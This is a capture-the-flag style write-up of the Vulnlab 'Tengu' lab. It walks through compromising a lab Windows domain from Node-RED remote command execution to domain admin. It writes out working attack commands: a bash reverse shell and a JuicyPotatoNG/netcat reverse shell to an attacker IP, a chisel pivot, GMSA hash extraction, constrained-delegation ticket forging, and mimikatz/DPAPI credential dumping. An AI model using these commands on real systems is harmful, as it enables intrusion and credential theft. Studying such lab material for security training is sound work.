# Vulnlab - Tengu

## DC.tengu.vl

```bash
PORT     STATE SERVICE       VERSION
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=DC.tengu.vl
| Issuer: commonName=DC.tengu.vl
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-09-14T15:26:33
| Not valid after:  2025-03-16T15:26:33
| MD5:   b350:11ed:41ce:ff32:a34f:0088:ce22:96f5
|_SHA-1: 711b:6409:e399:0771:d3d3:7eba:1938:5914:7c84:7528
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

## SQL.tengu.vl

```bash
PORT     STATE SERVICE       VERSION
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2024-09-15T15:30:31+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=SQL.tengu.vl
| Issuer: commonName=SQL.tengu.vl
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-09-14T15:26:45
| Not valid after:  2025-03-16T15:26:45
| MD5:   3cd6:9298:18df:b91e:5194:c958:0df4:528b
|_SHA-1: b304:c807:0de4:a171:0c1a:8b16:1f3e:bd29:2e21:99b5
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

```

## nodered.tengu.vl

```bash
PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|_  256 41:c7:d4:28:ec:d8:5b:aa:97:ee:c0:be:3c:e3:aa:73 (ED25519)
1880/tcp open  vsat-control?
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Both windows hosts had only RDP service enabled, on linux hosts, there was something hosted on port 1880 which on googling shows it runs Node-RED, which is a flow based development tool for visual programming used in IoT devices

<img src="https://i.imgur.com/DVKxUbk.png"/>

## Remote Command Execution Through Node-RED

Node-RED is known for getting remote command execution (RCE), to achieve this, we'll need to create a flow by timestamp block following exec block

<img src="https://i.imgur.com/CuLDFKt.png"/>

Replacing the curl command with bash reverse shell

<img src="https://i.imgur.com/HCcZ8G6.png"/>

```bash
bash -i >& /dev/tcp/10.8.0.136/2222 0>&1
```

After having the shell, it can be stabilized with python3 to use it as a normal shell

<img src="https://i.imgur.com/ZhpmGCP.png"/>

From `nodered` directory, we can find some type of hashed password but not really sure who this belongs to and how this can be cracked

<img src="https://i.imgur.com/RgdICoH.png"/>

## Accessing MSSQL

From sql node properties, we can see the connection string with the username `nodered_connector`

<img src="https://i.imgur.com/DI5KPTP.png"/>

So there's a script to decrypt the node-red credentials, which needs `flows_cred.json` and  `.config.runtime.json`
https://gist.github.com/Yeeb1/fe9adcd39306e3ced6bdfc7758a43519

<img src="https://i.imgur.com/wSSYj93.png"/>

In order to connect to MSSQL, we'll need to performing pivoting since that service isn't exposed we'll use chisel socks proxy

```bash
chisel server --reverse -p 3000
chisel client 10.8.0.136:3000 R:socks
```

<img src="https://i.imgur.com/nsUiv1Y.png"/>

With this, we'll be able to reach port 1433 on sql.tengu.vl

<img src="https://i.imgur.com/7XULYy4.png"/>

Trying to enable `xp_cmdshell` resulted in no luck as this user didn't had privileged in mssql

<img src="https://i.imgur.com/JoofgoC.png"/>

Enumerating the databases, there are two, which are not available by default, `Dev` and `Demo`

<img src="https://i.imgur.com/5fPlFgo.png"/>

Dev didn't had anything interesting while there was one set of credential from Demo

<img src="https://i.imgur.com/001siDc.png"/>

Attempting to crack this with rockyou.txt didn't work as the password wasn't present there however crackstation came in handy here

<img src="https://i.imgur.com/fLZciwp.png"/>

<img src="https://i.imgur.com/62buPKb.png"/>

Having the credentials, we can verify if this is a valid domain user

<img src="https://i.imgur.com/e6T9dEw.png"/>

With `bloodhound-python`, the domain can be enumerated

```bash
proxychains bloodhound-python -d tengu.vl -u t2_m.winters -p 'Tengu123' -c all -ns 10.10.183.37 
```

<img src="https://i.imgur.com/EwzmEoc.png"/>

## Escalating privileges on linux host

From bloodhound, t2_m.winters is a member of linux admin group which means we can have local admin on the linux host

<img src="https://i.imgur.com/vJy4Kgj.png"/>

Through ssh we can easily switch to `t2_m.winters` user

<img src="https://i.imgur.com/MvFRpCE.png"/>

this host has `ReadGMSAPassword` on `GMSA01$` account

<img src="https://i.imgur.com/cmO32Sb.png"/>

## Constrained Delegation on SQL Host

The NThash can be retrieved from `/etc/krb5.keytab`, this file contains service account hash in this case has NODERED's NThash, the hash can be extracted with KeyTabExtract https://github.com/sosdave/KeyTabExtract/tree/master

<img src="https://i.imgur.com/mBoMFos.png"/>

This hash can be verified by authenticating on DC

<img src="https://i.imgur.com/5APWnDt.png"/>

GMSA hash can be retrieved by using `--gmsa` module on LDAP

```bash
proxychains nxc ldap 10.10.238.213  -u 'NODERED$' -H 'hash' --gmsa
```

<img src="https://i.imgur.com/YpV4Nyt.png"/>

This account has `AllowedToDelegate` permission on SQL host which means we can impersonate as a local admin on this host through MSSQL service, performing constrained delegation

<img src="https://i.imgur.com/DVWhW1q.png"/>

<img src="https://i.imgur.com/h6mwH98.png"/>

With getST.py we can try to impersonate as administrator user for MSSQL service sql host but it didn't worked for administrator

<img src="https://i.imgur.com/ctAd3zd.png"/>

Instead of admin, we can check what other users we could target, there's a group name `SQL Admins` , with two users

<img src="https://i.imgur.com/RFf5ajf.png"/>

<img src="https://i.imgur.com/c0ECvWn.png"/>

Here we can try to impersonate `T1.M_Winters` and then login through MSSQL using the ticket

```bash
proxychains impacket-getST -spn 'MSSQLSvc/sql.tengu.vl' -impersonate 'T1_M.WINTERS' -hashes :hash 'tengu.vl/gMSA01$'@sql.tengu.vl -dc-ip 10.10.168.213
```

<img src="https://i.imgur.com/SapDngi.png"/>

From here xp_cmdshell can be enabled and system commands can be executed in the context of  `gmsa01$`

<img src="https://i.imgur.com/ETRmBYU.png"/>

With netcat, we can get a reverse shell

<img src="https://i.imgur.com/GcMwq9K.png"/>

Checking our privileges, we can get local administrator by abusing `SeImpersonatePrivilege` with JuicyPotato-NG or any other recent potato exploit

<img src="https://i.imgur.com/idmTVMb.png"/>

```bash
JuicyPotatoNG.exe -t * -p "C:\Windows\system32\cmd.exe" -a "/c C:/Windows/Temp/nc.exe 10.8.0.136 3333 -e cmd.exe"
```

<img src="https://i.imgur.com/NCQKU09.png"/>

<img src="https://i.imgur.com/TWQSBKe.png"/>

## Lateral Movement - Extracting Credentials Trough DPAPI

Running mimikatz to dump local admin hash and checking if there are any hashes in lsass

<img src="https://i.imgur.com/LYGVWwE.png"/>

 With `lsadump::cache` , domain cached credentials can be found where there's cached credentials for `c.fowler` but obviously this is not in NThash format so it cannot be used in pth unless it's gets cracked, which in this case was not the way

<img src="https://i.imgur.com/EJbLRYt.png"/>

To dump saved credentials from credential Manager/ task scheduler, we can target DPAPI which stores credentials with user specific keys, being a local admin we can utilize `sharpdpapi` to dump all credentials 

```bash
SharpDPAPI.exe machinecredentials
```

<img src="https://i.imgur.com/OX7iX2X.png"/>

## Using kerberos authentication to spawn a shell as T0_c.fowler

T0_c.fowler is a domain admin, authenticating against the DC to see if the password is valid

<img src="https://i.imgur.com/R3PvJ1B.png"/>

But the plain text password wasn't working and it's probably due to admin users belonging to Protected Users Group which is why we'll need to use kerberos authentication

<img src="https://i.imgur.com/yS1lrHV.png"/>

So instead, using `kinit` we can request TGT for the user by specifying the plain text password and we'll get our ticket using by modifying the  `/etc/krb5.conf` configuration file

```bash
[libdefaults]
        default_realm = TENGU.VL
        kdc_timesync = 1
        ccache_type = 4
        forwardable = true
        proxiable = true
        rdns = false
        dns_canonicalize_hostname = false
        fcc-mit-ticketflags = true

[realms]
        TENGU.VL = {
                kdc = dc.tengu.vl
        }

[domain_realm]
        .tengu.vl = TENGU.VL

```

<img src="https://i.imgur.com/fqceLwJ.png"/>

Having the ticket, we can just dump hashes from ntds.dit using `secretsdump.py` or just spawn a shell using smb, wmi or psexec

<img src="https://i.imgur.com/alNNOhz.png"/>

<img src="https://i.imgur.com/hE0eisH.png"/>

# References

- https://quentinkaiser.be/pentesting/2018/09/07/node-red-rce/
- https://gist.github.com/Yeeb1/fe9adcd39306e3ced6bdfc7758a43519
- https://github.com/sosdave/KeyTabExtract/tree/master
